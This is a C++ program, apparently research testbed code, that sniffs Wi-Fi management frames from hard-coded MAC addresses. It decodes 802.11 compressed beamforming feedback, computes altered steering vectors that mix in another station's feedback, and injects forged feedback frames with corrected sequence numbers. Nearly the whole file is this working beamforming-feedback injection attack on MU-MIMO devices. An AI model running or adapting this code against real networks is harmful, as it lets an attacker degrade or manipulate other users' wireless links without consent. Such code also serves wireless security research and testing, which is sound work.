#include <iostream>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <signal.h>
#include <vector>
#include <Eigen/Core>
#include <bitset> 
#include <cmath>
#include <random>
#include <thread>
#include <sys/sysinfo.h>
#define MAX_PACKET_SIZE 65535
#define NumBitsPhi 9
#define NumBitsPsi 7


// 此版本是action后进行注入
// 此版本设计用于1*1MU-MIMO设备注入测试
// (wlan.fc == 0x5400 && wlan.ra == 90:de:80:f1:4a:b2) || (wlan.ta == 90:de:80:f1:4a:b2 && wlan.fc.subtype==14)
const float pi = 3.14159265;// 358979323846;
const std::complex<float> complex_j(0,1.0);

int app_stopped = 0;
std::seed_seq seed{1, 2, 3, 4, 5};
std::mt19937 rng(seed);
int save_lock = 0, save_lock2 = 0;
int save_lock_bak = 0, save_lock_bak2 = 0;

const float alpha = 1;
const float sqrt_1_alpha = std::sqrt(1-alpha);
const float sqrt_alpha = std::sqrt(alpha);


void sigint_handler(int sig){
	if(sig == SIGINT){
		// ctrl+c退出时执行的代码
		printf("ctrl+c pressed!\n");
		app_stopped = 1;
	}
}

int len_mu_feedback = 312;


std::vector<Eigen::Matrix<std::complex<float>, 4, 1>> BFI2V(unsigned char * feedback){
	int Nr = 4, Nc = 1, Nst = 52;
	double pow_phi = std::pow(2, NumBitsPhi), pow_psi = std::pow(2, NumBitsPsi+2);

	//int len_mu_feedback = sizeof(feedback);
	std::string binaryString = "";

	//std::cout<< "len_mu_feedback " << len_mu_feedback << std::endl;
	std::string tmp_bin;
    for (int i=0; i < len_mu_feedback; i++) {
        // 将整数转换为二进制字符串，并连接到结果字符串
		//printf("%x, ", (int)mu_feedback[i] );
		//std::cout  << std::bitset<8>(mu_feedback[i]).to_string() << " ";
        tmp_bin = std::bitset<8>(feedback[i]).to_string();
		std::reverse(tmp_bin.begin(), tmp_bin.end());
        binaryString += tmp_bin;
    }
	save_lock_bak2 = 0;

	//std::cout << std::endl;
	//std::cout<< "binaryString: " << binaryString << std::endl;
	
	// 二进制字符串转化为角度信息
	Eigen::Matrix<float, 6, 52> angles;
	int index = 0;
	//std::cout << binaryString.substr(index, index+NumBitsPhi) << ", V:" << std::bitset<9>(binaryString.substr(index, index+NumBitsPhi)).to_ulong() << ", pow " << std::pow(2, NumBitsPhi) << std::endl;
	for(int kk=0; kk<Nst; kk++){
		int angcnt = 0;
		for(int ii=Nr-1; ii>=std::max(Nr-Nc, 1); ii--){
			for(int jj=0; jj<ii; jj++){
				std::string tmp = binaryString.substr(index, NumBitsPhi);
				std::reverse(tmp.begin(), tmp.end());
				angles(angcnt, kk) = (2* std::bitset<NumBitsPhi>(tmp).to_ulong()+1)/( pow_phi );
				angcnt++;
				index = index + NumBitsPhi;
			}
			for(int jj=0; jj<ii; jj++){
				//if(jj==0) std::cout << "kk: "<< kk <<"," << binaryString.substr(index, NumBitsPsi) << ", " << std::bitset<9>(binaryString.substr(index, index+NumBitsPsi)).to_ulong() << std::endl;
				std::string tmp = binaryString.substr(index, NumBitsPsi);
				std::reverse(tmp.begin(), tmp.end());
				angles(angcnt, kk) = (2*std::bitset<NumBitsPsi>(tmp).to_ulong()+1)/( pow_psi );
				angcnt++;
				index = index + NumBitsPsi;
			}

		}
	}

	// 将角度转化为V
	Eigen::Matrix<std::complex<float>, 4, 1> V_kk;
	V_kk << 1,0, 0,0;
	Eigen::Matrix<std::complex<float>, 4, 1> D;
	D << 1, 1, 1, 1;
	Eigen::Matrix<std::complex<float>, 4, 1> D_tmp;
	// std::cout << V_kk << std::endl;
	std::vector< Eigen::Matrix<std::complex<float>, 4, 1> >  V(52, V_kk);
	//std::cout << V[1] << std::endl;
	Eigen::Matrix<float, 4, 4> Gt;
	int p = std::min(Nc, Nr-1);
	int NumAnglesCnt = 6;
	for(int ii=p; ii>=1; ii--){
		//std::cout << "ii " << ii<< std::endl;
		for(int jj=Nr; jj>=ii+1; jj--){
			for(int kk=0; kk<Nst; kk++){
				Gt.setIdentity(4,4);
				//std::cout << V[kk] << std::endl;
				Gt(ii-1,ii-1) = std::cos(angles(NumAnglesCnt-1,kk)*pi);
				Gt(ii-1,jj-1) = -1*std::sin(angles(NumAnglesCnt-1,kk)*pi);
            	Gt(jj-1,ii-1) = std::sin(angles(NumAnglesCnt-1,kk)*pi);
            	Gt(jj-1,jj-1) = std::cos(angles(NumAnglesCnt-1,kk)*pi);
				//std::cout << std::cos(angles(NumAnglesCnt-1,kk)*pi) << std::endl;
				//std::cout << V[kk] << std::endl;
            	V[kk] = Gt*V[kk];
				//if(kk==0) std::cout<< V[kk] <<std::endl;

			}
			NumAnglesCnt--;
		}
		for(int kk=0; kk<Nst; kk++){
			D_tmp = D;
			index = 0;
			for(int jj=-Nr+ii+1; jj<=0; jj++){
				D_tmp[ii-1+index] = std::exp(complex_j*pi*angles(NumAnglesCnt+jj-1,kk));
				index ++;
			}
			for(int jj=0; jj<Nr; jj++){
				V[kk].row(jj) *=  D_tmp[jj];
			}
		}
		NumAnglesCnt = NumAnglesCnt - Nr + ii;
	}
	return V;

}










void re_beamforming(unsigned char * feedback, unsigned char * feedback_new){
	struct timeval tv;
	struct timeval tv2;
	gettimeofday(&tv, NULL);
	int Nr = 4, Nc = 1, Nst = 52;
	double pow_phi = std::pow(2, NumBitsPhi), pow_psi = std::pow(2, NumBitsPsi+2);


	double sqrt_alpha=0.2;
	std::vector<Eigen::Matrix<std::complex<float>, 4, 1>> V = BFI2V(feedback);
	std::vector<Eigen::Matrix<std::complex<float>, 4, 1>> V2 = BFI2V(feedback_new);

	//gettimeofday(&tv2, NULL);
	//std::cout << "time: " << (tv2.tv_sec-tv.tv_sec)+(tv2.tv_usec-tv.tv_usec)/1000000.f << std::endl;
	// 寻找正交矩阵W
	Eigen::Matrix<std::complex<float>, 4, 1> V_kk;
	V_kk << 0,0, 0,0;
	std::vector< Eigen::Matrix<std::complex<float>, 4, 1> >  W(52, V_kk);
	Eigen::Matrix<std::complex<float>, 4, 1>  R_rand = Eigen::MatrixXf::Random(4,1) + complex_j*Eigen::MatrixXf::Random(4,1);
	//std::cout << "R: " << R_rand << std::endl;
	for(int kk=0; kk<Nst; kk++){
		// W[kk].col(0) = R_rand.col(0) - V[kk].col(0).adjoint()*R_rand.col(0)*V[kk].col(0) - V[kk].col(1).adjoint()*R_rand.col(0)*V[kk].col(1);	
		
		// W[kk].col(0) = V2[kk].col(0) - V[kk].col(0).adjoint()*R_rand.col(0)*V[kk].col(0);
		// W[kk].col(0) = W[kk].col(0)/W[kk](3,0);
		// W[kk].col(0) = W[kk].col(0)/W[kk].col(0).norm();

		W[kk].col(0) = V2[kk].col(0) - sqrt_alpha*V[kk].col(0).adjoint()*V2[kk].col(0)*V[kk].col(0);
		W[kk].col(0) = W[kk].col(0)/W[kk](3,0);
		W[kk].col(0) = W[kk].col(0)/W[kk].col(0).norm();


		// W[kk].col(1) = R_rand.col(1) - V[kk].col(0).adjoint()*R_rand.col(1)*V[kk].col(0) 
		// 	- V[kk].col(1).adjoint()*R_rand.col(1)*V[kk].col(1) - W[kk].col(0).adjoint()*R_rand.col(1)*W[kk].col(0);
		// W[kk].col(1) = W[kk].col(1)/W[kk](3,1);
		// W[kk].col(1) = W[kk].col(1)/W[kk].col(1).norm();
		//std::cout <<  W[kk] << std::endl;
		//std::cout <<  V[kk].adjoint()*W[kk] << std::endl;
		//std::cout <<  V[kk].adjoint()*V[kk] << std::endl;
		//std::cout <<  W[kk].adjoint()*W[kk] << std::endl;
		// W[kk].col(0) = W[kk].col(0).adjoint()*V2[kk].col(0)*W[kk].col(0) + W[kk].col(1).adjoint()*V2[kk].col(0)*W[kk].col(1);
		//引入被攻击方BFI矩阵
		// W[kk].col(0) = W[kk].col(0).adjoint()*V2[kk].col(0)*W[kk].col(0);
		// W[kk].col(0) = W[kk].col(0)/W[kk](3,0);
		// W[kk].col(0) = W[kk].col(0)/W[kk].col(0).norm();

		// W[kk].col(1) = R_rand.col(1) - V[kk].col(0).adjoint()*R_rand.col(1)*V[kk].col(0) 
		// 	- V[kk].col(1).adjoint()*R_rand.col(1)*V[kk].col(1) - W[kk].col(0).adjoint()*R_rand.col(1)*W[kk].col(0);
		// W[kk].col(1) = W[kk].col(1)/W[kk](3,1);
		// W[kk].col(1) = W[kk].col(1)/W[kk].col(1).norm();

		// W[kk].col(0) = V2[kk].col(0);

		// W[kk].col(0) =  sqrt_1_alpha * V[kk].col(0) + sqrt_alpha * W[kk].col(0);
		// W[kk].col(1) =  sqrt_1_alpha * V[kk].col(1) + sqrt_alpha * W[kk].col(1);
	}
	
	// 将W转化为相位

	int NumAngles = 6;
	Eigen::Matrix<float, 6, 52> angles_W;
	Eigen::Matrix<float, 4, 4> Gt;
	int angcnt = 0;
	float phi = 0, psi = 0;
	for(int ii=1; ii<=std::min(Nc, Nr-1); ii++){
		//int index = 0;
		for(int kk=0; kk<Nst; kk++){
			for(int jj=0; jj<Nr-ii; jj++){
				phi = std::arg(W[kk](ii+jj-1,ii-1));
				//std::cout << "phi " << phi << " w " << W[kk](ii+jj-1,ii-1) << std::endl;
				if(phi<0) phi += pi*2;
				angles_W(angcnt+jj, kk) = phi;
			}
			//D_tmp = D;
			for(int jj=0; jj<Nr-ii; jj++){
				W[kk].row(ii-1+jj) *= std::exp(-complex_j*angles_W(angcnt+jj, kk));
			}
		}
		angcnt = angcnt + Nr-ii;
		for(int ll=ii+1; ll<=Nr; ll++){
			for(int kk=0; kk<Nst; kk++){
				psi = std::atan(W[kk](ll-1,ii-1).real() / W[kk](ii-1,ii-1).real());
				angles_W(angcnt, kk) = psi;

				Gt.setIdentity(4,4);
				Gt(ii-1,ii-1) = std::cos(psi);
				Gt(ii-1,ll-1) = std::sin(psi);
				Gt(ll-1,ii-1) = -std::sin(psi);
				Gt(ll-1,ll-1) = std::cos(psi);  
				W[kk] = Gt*W[kk]; 
			}
			angcnt ++;
		}
	}
	//std::cout << "angcnt: " << angcnt << std::endl;

	//将相位转化为bit
	std::string tmp_string;
	std::string binaryString_W = "";
	int tmp = 0;
	for(int kk=0; kk<Nst; kk++){
		int angcnt = 0;
		for(int ii=Nr-1; ii>=std::max(Nr-Nc,1); ii--){
			for(int jj=1; jj<=ii; jj++){
				tmp = std::round(0.5*((angles_W(angcnt,kk)*(( pow_phi ))/pi)-1));
				tmp_string = std::bitset<NumBitsPhi>(tmp).to_string();
				std::reverse(tmp_string.begin(), tmp_string.end());
				binaryString_W += tmp_string;
				angcnt ++;
			}
			for(int jj=1; jj<=ii; jj++){
				tmp = std::round(0.5*((angles_W(angcnt,kk)*(( pow_psi ))/pi)-1));
				tmp_string = std::bitset<NumBitsPsi>(tmp).to_string();
				std::reverse(tmp_string.begin(), tmp_string.end());
				binaryString_W += tmp_string;
				angcnt ++;
			}
		}
	}

	int index = 0;
	std::string tmp_bin;
	for (int i=0; i < len_mu_feedback; i++) {
		tmp_bin = binaryString_W.substr(index, 8);
		std::reverse(tmp_bin.begin(), tmp_bin.end());
		feedback_new[i] = std::bitset<8>(tmp_bin).to_ulong();
		index += 8;
		//printf("%x, ", feedback[i]);
		//std::cout << "binaryString_W: " <<binaryString_W
	}

	gettimeofday(&tv2, NULL);
	std::cout << "time: " << (tv2.tv_sec-tv.tv_sec)+(tv2.tv_usec-tv.tv_usec)/1000000.f << std::endl;
}
long get_linux_uptime(){
	struct sysinfo info;
	sysinfo(&info);
	return info.uptime;
}

int main() {
    char *dev = "wlp88s0"; //wlan0mon, wlx00c0cab3f55d
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = NULL;
    pcap_t *send_handle = NULL;
    struct pcap_pkthdr header;
    struct timeval tv;
    //struct timeval tv2;
    //struct timeval tv3;
    int save_not = 0;
	
    // ctrl+c 
	signal(SIGINT, sigint_handler);

    
    //monitor -> sniff packets
    char pcap_errbuf[100];
	pcap_t *pcap = pcap_create("slp88s0", pcap_errbuf); // wlp3s0mon,  wlp43s0mon
	if (pcap == NULL) {
        printf("Could not open device or file: %s\n", pcap_errbuf);
        return 1;
    }
	int res_time = pcap_set_tstamp_type(pcap, PCAP_TSTAMP_HOST_HIPREC);
	pcap_set_snaplen(pcap, MAX_PACKET_SIZE);
    pcap_set_promisc(pcap, 1);
    //设置为immediate模式
	if (pcap_set_immediate_mode(pcap, 1)==PCAP_ERROR_ACTIVATED)
	{
		printf("pcap_set_immediate_mode\n");
        return 1;
	}
	int res_activate = pcap_activate(pcap);
    printf("res_time: %d, pcap_activate: %d\n", res_time, res_activate);

    struct bpf_program fp;
	//char filter_exp[] = "(type mgt and not (subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp or subtype probe-req or subtype probe-resp or subtype beacon or subtype atim or subtype disassoc or subtype auth or subtype deauth) and (wlan addr2 74:13:EA:BE:63:06 or wlan addr2 E4:0D:36:6D:AD:8F)) or (type ctl and not (subtype ps-poll or subtype rts or subtype cts or subtype ack or subtype cf-end or subtype cf-end-ack) and wlan addr1 ff:ff:ff:ff:ff:ff and wlan addr2 5C:02:14:B5:96:BD)";   // for NDP a & ta 15:59:c0:33:8b:77 90:de:80:a9:e5:8a 90:de:80:f1:4a:b2 and wlan addr1 ff:ff:ff:ff:ff:ff 15:59:c0:33:8b:77
	//char filter_exp[] = "(type mgt and not (subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp or subtype probe-req or subtype probe-resp or subtype beacon or subtype atim or subtype disassoc or subtype auth or subtype deauth) and (wlan addr2 00:1D:43:20:16:6a or wlan addr2 00:1D:43:20:16:7F)) or (type ctl and not (subtype ps-poll or subtype rts or subtype cts or subtype ack or subtype cf-end or subtype cf-end-ack) and wlan addr1 ff:ff:ff:ff:ff:ff and wlan addr2 A4:A9:30:95:22:5B)"; 
	//char filter_exp[] = "(type mgt and not (subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp or subtype probe-req or subtype probe-resp or subtype beacon or subtype atim or subtype disassoc or subtype auth or subtype deauth) and (wlan addr2 90:DE:80:F1:4A:B2 or wlan addr2 90:DE:80:A9:E5:8A)) or (type ctl and not (subtype ps-poll or subtype rts or subtype cts or subtype ack or subtype cf-end or subtype cf-end-ack) and wlan addr1 ff:ff:ff:ff:ff:ff and wlan addr2 A4:A9:30:95:22:5B)"; 
	char filter_exp[] = "(type mgt and not (subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp or subtype probe-req or subtype probe-resp or subtype beacon or subtype atim or subtype disassoc or subtype auth or subtype deauth) and (wlan addr2 50:2B:73:04:93:70 or wlan addr2 50:2B:73:30:2B:13 or wlan addr2 50:2B:73:34:2A:A2 or wlan addr2 50:2B:73:08:DC:68)) or (type ctl and not (subtype ps-poll or subtype rts or subtype cts or subtype ack or subtype cf-end or subtype cf-end-ack) and wlan addr1 ff:ff:ff:ff:ff:ff and wlan addr2 A4:A9:30:95:22:5B)";  // 50:2B:73:30:2B:13 50:2B:73:0C:D9:1C 50:2B:73:34:2A:A2 50:2B:73:08:DC:68 50:2B:73:0C:D9:1C
	if (pcap_compile(pcap, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        printf("Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(pcap));
        exit(0);
    }
	
	//pcap_setfilter:为pcap实例设置一个编译好的过滤程序
    if (pcap_setfilter(pcap, &fp) == -1) {
        printf("Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(pcap));
        exit(0);
    }

    //injected packet variable 
	struct pcap_pkthdr *pkh;
	u_char *h80211_rx = reinterpret_cast<uint8_t*>(malloc(4096));
	u_char *h80211_rx_bak = reinterpret_cast<uint8_t*>(malloc(4096));
	if (h80211_rx == NULL) {
		// 处理内存分配失败的情况
		exit(EXIT_FAILURE);
	}
	size_t n_rx = 0;
	for(int i=0; i<4096; i++)
		h80211_rx[i] = 0;

    // for injecting packets
    send_handle = pcap_open_live(dev, MAX_PACKET_SIZE, 1, 0, pcap_errbuf);
	if (send_handle == NULL) {
        printf("Send: could not open device or file: %s\n", pcap_errbuf);
        return 1;
    }


	gettimeofday(&tv, NULL);

    //	u8aRadiotap
	/*
    unsigned char u8aRadiotap[] = {
		0x00, 0x00, 
		0x1c, 0x00, 
		0x0a, 0x80, 0x20, 0x00, 
		0x90, 0x00, //flag
		0xc8, 0x14, //channel frequency
		0x40, 0x01, //channel flag
		0x18, 0x00, // TX flag
		0xff, 0x01, // VHT
		0x06, 0x00, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x80, 0x0f};

	*/
	unsigned char u8aRadiotap[] = {
		0x00,
		0x00, // <-- radiotap version
		0x0c, // <- radiotap header length
		0x00, 
		0x04, // radiotap present
		0x80,
		0x00,
		0x00, 
		0x6c, // <-- rate
		0x00, // <-- padding for natural alignment
		//0x0a, // <-- TX attenuation
		//0x00,
		0x18,
		0x00, // <-- TX flags
	};


    int len_u8aRadiotap = sizeof(u8aRadiotap);

	int num_dev = 4;
    unsigned char tx_buf_dev[num_dev][4096];
    //unsigned char tx_buf_dev2[4096];
	unsigned char dev_name[num_dev];
	//dev_name[1] = 0x06; dev_name[0] = 0x8F; 
	dev_name[0] = 0x68; dev_name[1] = 0x13;  dev_name[2] = 0x1C;  dev_name[3] = 0xA2;
    //存储sniff到的packets
    pcap_dumper_t * t;
    if (save_not)   t = pcap_dump_open(pcap, "tmp.pcap");
	
	int pcap_rx;
	int i = 0;
    int index_start;
    int len_head = 8*3;
	int mgt_head = 6 ; // MU mode ,4*2-->7, 4*1-->6
    int seq_num_action;
    int seq_num = 0;
    int len_packet;
	int flag[num_dev] = {0,0,0,0};
	int send_flag[num_dev] = {0,0,0,0};
	int i_dev=0;
	double time[num_dev];
	for(i_dev=0; i_dev < num_dev; i_dev++){
		//seq_num_action[i_dev] = 0;
		//len_packet[i_dev] = 0;
		//flags[i_dev] = 0;
		memcpy(tx_buf_dev[i_dev], u8aRadiotap, len_u8aRadiotap);
		time[i_dev] = -1;
	}
	i_dev = 0;
	int snr[num_dev];
	//snr[0] = 0x7c; 

    unsigned char token = 0;

	gettimeofday(&tv, NULL);
	int res_inject;
	int count = 0;
	while(i<4e5)
	{		
		if (app_stopped)  break;
		//int loop_do;
		do{	
			if (app_stopped)  break;
			int pcap_rx = pcap_next_ex(pcap, &pkh, (const unsigned char**)  &h80211_rx);
			index_start = h80211_rx[2];

		}while(! ( (h80211_rx[index_start] == 0xe0 && ((h80211_rx[index_start+len_head+3]>>3)%2)) || (h80211_rx[index_start]== 0x54) ));
	

		if(h80211_rx[index_start] == 0xe0 && h80211_rx[index_start+1] == 0x08) continue;

		printf("index: %d, type: %x,  \n", i, h80211_rx[index_start]);
		if(h80211_rx[index_start]==(uint8_t) 224)
        	{
		for(i_dev=0; i_dev<num_dev; i_dev++){
		// for(i_dev=0; i_dev<2; i_dev++){
			if(h80211_rx[index_start+15] == dev_name[i_dev]){
				time[i_dev] = (pkh->ts.tv_sec-tv.tv_sec)+(pkh->ts.tv_usec-tv.tv_usec)/1000000.f;
				memcpy(tx_buf_dev[i_dev] + len_u8aRadiotap, &h80211_rx[index_start], pkh->caplen-index_start-4);
				flag[i_dev] = 1;
				//std::cout << "time: " << time[0] << " " << time[1] << std::endl;
				//if(1){ i++; //std::cout << i << " ";
				//std::cout << "sssssssssssssss " << i_dev << std::endl;
				//if(std::abs(time[0]-time[1])<0.001){
					//printf("")
				count ++;
				if(flag[1])
				switch (i_dev)
				{
				case 0:
					if(flag[i_dev])
									{
					re_beamforming(&tx_buf_dev[1][len_u8aRadiotap+len_head+mgt_head], &tx_buf_dev[0][len_u8aRadiotap+len_head+mgt_head]);
					tx_buf_dev[0][len_u8aRadiotap+1] = 0x08; 
					//tx_buf_dev[0][len_u8aRadiotap+29] = 0x7C;
					//tx_buf_dev[0][len_u8aRadiotap+30] = 0x7C;
					len_packet = pkh->caplen-index_start+len_u8aRadiotap - 4;
					double ret=get_linux_uptime();
					std::cout << "sssssssssssssss Time: " <<ret<< std::endl;
					count = 0;
					send_flag[i_dev]=1;
				}
					break;
				case 2:
					if(flag[i_dev])
									{
					re_beamforming(&tx_buf_dev[1][len_u8aRadiotap+len_head+mgt_head], &tx_buf_dev[2][len_u8aRadiotap+len_head+mgt_head]);
					tx_buf_dev[2][len_u8aRadiotap+1] = 0x08; 
					//tx_buf_dev[0][len_u8aRadiotap+29] = 0x7C;
					//tx_buf_dev[0][len_u8aRadiotap+30] = 0x7C;
					len_packet = pkh->caplen-index_start+len_u8aRadiotap - 4;
					double ret=get_linux_uptime();
					std::cout << "sssssssssssssss Time: " <<ret<< std::endl;
					count = 0;
					send_flag[i_dev]=1;
				}
					break;
				case 3:
					if(flag[i_dev])
									{
					re_beamforming(&tx_buf_dev[1][len_u8aRadiotap+len_head+mgt_head], &tx_buf_dev[3][len_u8aRadiotap+len_head+mgt_head]);
					tx_buf_dev[3][len_u8aRadiotap+1] = 0x08; 
					//tx_buf_dev[0][len_u8aRadiotap+29] = 0x7C;
					//tx_buf_dev[0][len_u8aRadiotap+30] = 0x7C;
					len_packet = pkh->caplen-index_start+len_u8aRadiotap - 4;
					double ret=get_linux_uptime();
					std::cout << "sssssssssssssss Time: " <<ret<< std::endl;
					count = 0;
					send_flag[i_dev]=1;
				}
					break;
				default:
					break;
				}

			}			
		}}
		else{
			if(flag[0] && flag[1]){
			i_dev = 0;
			seq_num_action = (int)(tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1])* 16 + ((int) (tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2])>>4);
            		seq_num = seq_num_action + ((h80211_rx[index_start+16]-tx_buf_dev[i_dev][len_u8aRadiotap + len_head + 4])>>2);
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2] = (seq_num % 16) << 4;
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1] = (int) (seq_num / 16); 
			res_inject = pcap_inject(send_handle, tx_buf_dev[i_dev], len_packet);			
			i++;
			}
						if(flag[2] && flag[1]){
			i_dev = 2;
			seq_num_action = (int)(tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1])* 16 + ((int) (tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2])>>4);
            		seq_num = seq_num_action + ((h80211_rx[index_start+16]-tx_buf_dev[i_dev][len_u8aRadiotap + len_head + 4])>>2);
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2] = (seq_num % 16) << 4;
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1] = (int) (seq_num / 16); 
			res_inject = pcap_inject(send_handle, tx_buf_dev[i_dev], len_packet);			
			i++;
			}
						if(flag[3] && flag[1]){
			i_dev = 3;
			seq_num_action = (int)(tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1])* 16 + ((int) (tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2])>>4);
            		seq_num = seq_num_action + ((h80211_rx[index_start+16]-tx_buf_dev[i_dev][len_u8aRadiotap + len_head + 4])>>2);
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-2] = (seq_num % 16) << 4;
            		tx_buf_dev[i_dev][len_u8aRadiotap+len_head-1] = (int) (seq_num / 16); 
			res_inject = pcap_inject(send_handle, tx_buf_dev[i_dev], len_packet);			
			i++;
			}
		}

		/*
        printf("index: %d, type: %x,  \n", i, h80211_rx[index_start]);
        if (save_not) pcap_dump((u_char *) t, pkh, h80211_rx);

		
		memcpy(tx_buf_dev[i_dev] + len_u8aRadiotap, &h80211_rx[index_start], len_head+7);
		tx_buf_dev[i_dev][len_u8aRadiotap+1] = 0x08; 

		re_beamforming(&h80211_rx[index_start+len_head+7], &tx_buf_dev[i_dev][len_u8aRadiotap+len_head+7]);
		len_packet[i_dev] = pkh->caplen-index_start+len_u8aRadiotap - 4;
		int res_inject = pcap_inject(send_handle, tx_buf_dev[i_dev], len_packet[i_dev]);
    	i++;
        */
	}

	if (save_not)   pcap_dump_close(t);
	//fclose(f_cap);
	printf("end!\n");
	pcap_close(pcap);
	pcap_close(send_handle);
    return 0;
}
